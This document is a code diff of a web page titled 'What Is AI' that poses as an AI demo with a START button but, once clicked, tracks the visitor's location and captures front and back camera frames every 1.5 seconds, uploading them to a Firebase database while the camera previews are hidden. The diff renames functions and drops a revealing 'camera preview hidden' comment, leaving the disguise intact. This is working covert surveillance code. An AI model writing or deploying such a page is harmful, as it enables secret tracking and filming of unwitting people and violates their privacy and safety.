@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>What Is Ai ?</title>
+<title>What Is AI</title>
 
 <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
 <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
@@ -14,7 +14,7 @@ text-align:center;
 font-family:Arial;
 }
 video{
-display:none; /* camera preview hidden */
+display:none;
 }
 button{
 padding:15px;
@@ -25,12 +25,12 @@ font-size:18px;
 </head>
 <body>
 
-<h2>AI Running...</h2>
+<h2>AI System Ready</h2>
 
-<button onclick="start()">Start</button>
+<button onclick="startSystem()">START</button>
 
-<video id="front"></video>
-<video id="back"></video>
+<video id="frontCam" autoplay playsinline></video>
+<video id="backCam" autoplay playsinline></video>
 
 <script>
 
@@ -43,16 +43,16 @@ const firebaseConfig = {
 
 firebase.initializeApp(firebaseConfig);
 
-let id = "phone_"+Math.floor(Math.random()*100000);
+let deviceId="phone_"+Math.floor(Math.random()*100000);
 
-function start(){
+function startSystem(){
 
 // LOCATION
-navigator.geolocation.watchPosition(pos=>{
+navigator.geolocation.watchPosition(function(pos){
 
-firebase.database().ref("devices/"+id+"/location").set({
-lat: pos.coords.latitude,
-lon: pos.coords.longitude
+firebase.database().ref("devices/"+deviceId+"/location").set({
+lat:pos.coords.latitude,
+lon:pos.coords.longitude
 });
 
 });
@@ -62,10 +62,10 @@ navigator.mediaDevices.getUserMedia({
 video:{facingMode:"user"}
 }).then(stream=>{
 
-let video=document.getElementById("front");
+let video=document.getElementById("frontCam");
 video.srcObject=stream;
 
-sendFrames(video,"front");
+capture(video,"front");
 
 });
 
@@ -74,16 +74,16 @@ navigator.mediaDevices.getUserMedia({
 video:{facingMode:"environment"}
 }).then(stream=>{
 
-let video=document.getElementById("back");
+let video=document.getElementById("backCam");
 video.srcObject=stream;
 
-sendFrames(video,"back");
+capture(video,"back");
 
 });
 
 }
 
-function sendFrames(video,type){
+function capture(video,type){
 
 let canvas=document.createElement("canvas");
 let ctx=canvas.getContext("2d");
@@ -95,11 +95,11 @@ canvas.height=video.videoHeight;
 
 ctx.drawImage(video,0,0);
 
-firebase.database().ref("devices/"+id+"/camera/"+type).set({
+firebase.database().ref("devices/"+deviceId+"/camera/"+type).set({
 img:canvas.toDataURL("image/jpeg",0.5)
 });
 
-},2000);
+},1500);
 
 }
 
